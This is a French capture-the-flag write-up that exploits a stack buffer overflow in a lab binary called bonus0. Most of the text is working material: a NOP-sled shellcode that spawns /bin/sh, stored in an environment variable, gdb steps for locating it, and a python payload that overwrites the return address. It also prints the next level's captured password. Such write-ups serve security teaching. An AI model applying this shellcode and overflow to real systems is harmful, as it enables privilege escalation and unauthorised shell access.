# Analyse du binaire

Le binaire bonus0 présente une vulnérabilité de type stack buffer overflow.

Nous injectons un shellcode dans une variable d’environnement, puis nous faisons déborder un buffer afin d’écraser une adresse de retour avec un retour dans le shellcode. Ce shellcode lance un shell (/bin/sh).

# preparation du payload

## Injection du Shellcode

On doit fair cela car dans GDB les adresse sont decale par rapport a une execution normal. Donc afin de facilite l'exploite nous la mettons dans la variable d'environement

On place un shellcode dans une variable d’environnement :

```bash 
export SHELLCODE=$(python -c 'print "\x90" * 1024 + "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"')
```

## Reperage de l'adresse du shellcode

On utilise gdb pour afficher la pile et trouver l'adresse du shellcode :

```bash
gdb ./bonus0
(gdb) x/100s $esp
[…]
0xbffff4f1: "SHELLCODE=..."
[…]
```

## Construction du Payload

Le buffer vulnérable permet d’écrire un peu plus que prévu. On va :
- Remplir le début avec des caractères ("a"*20) pour atteindre l’adresse de retour.
- Sauter à l’intérieur du NOP sled avec une adresse comme 0xbffff5e9.

```bash
(python -c 'print "a" * 20' ; python -c 'import struct; print "b" * 9 + struct.pack("<I", 0xbffff5e9) + "b" * 7' ; cat) | ./bonus0
```
On adapte l’adresse (0xbffff5e9) selon ce qu’on trouve avec GDB (juste avant ou dans le NOP sled).

# Exploitation 

```bash
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

